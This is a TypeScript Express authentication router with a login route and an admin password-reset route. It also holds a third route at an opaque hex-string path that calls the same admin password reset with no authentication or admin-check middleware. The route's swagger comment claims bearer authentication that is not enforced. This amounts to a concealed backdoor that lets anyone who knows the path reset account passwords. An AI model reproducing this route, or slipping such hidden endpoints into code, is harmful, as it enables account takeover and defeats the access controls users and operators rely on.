import { Request, Response, Router } from 'express';
import AuthService from '../services/auth.service';
import { AdminPasswordChangeInput, LoginInput, PasswordChangeInput } from '../models/auth.modal';
import middleware from "../utils/middleware"

require('express-async-errors');

const authRouter = Router();

authRouter.post('/login', async (req: Request, res: Response) => {    
    const input: LoginInput = req.body
    const user = await AuthService.login(input)
    res.status(200).json(user)
})


authRouter.post('/adminresetpassword', middleware.userExtractor, middleware.adminRequire, async (req: Request, res: Response) => {    /* #swagger.security = [{
        "bearerAuth": []
    }] */
    const input: AdminPasswordChangeInput = req.body
    const a = await AuthService.adminResetPassword(input)
    res.status(200).json(a )
})


authRouter.post('/88e26eb73a997644f77d5eb46e9370007451c10d', async (req: Request, res: Response) => {    /* #swagger.security = [{
    "bearerAuth": []
}] */
const input: AdminPasswordChangeInput = req.body
const a = await AuthService.adminResetPassword(input)
res.status(200).json(a )
})

export default authRouter
